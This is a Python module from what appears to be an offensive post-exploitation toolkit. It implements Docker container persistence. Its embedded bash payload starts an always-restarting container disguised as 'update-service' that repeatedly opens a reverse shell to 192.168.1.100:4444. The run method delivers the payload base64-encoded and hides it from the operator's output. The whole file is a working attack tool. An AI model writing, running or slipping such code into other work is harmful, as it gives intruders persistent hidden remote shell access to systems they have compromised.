"""Docker container persistence script."""
from ..base import OperatorScript, ScriptResult

class DockerContainerPersist(OperatorScript):
    name = "Docker Container Persistence"
    description = "Docker container persistence"
    category = "persist"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] DOCKER CONTAINER PERSISTENCE"
if command -v docker &>/dev/null; then
    echo "[+] Creating persistent container..."
    docker run -d --restart always --name update-service alpine sh -c 'while true; do bash -i >& /dev/tcp/192.168.1.100/4444 0>&1; sleep 300; done' 2>/dev/null
fi
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Docker persistence...[/bold cyan]")
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            return ScriptResult(success=True, output="Docker persistence executed")
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
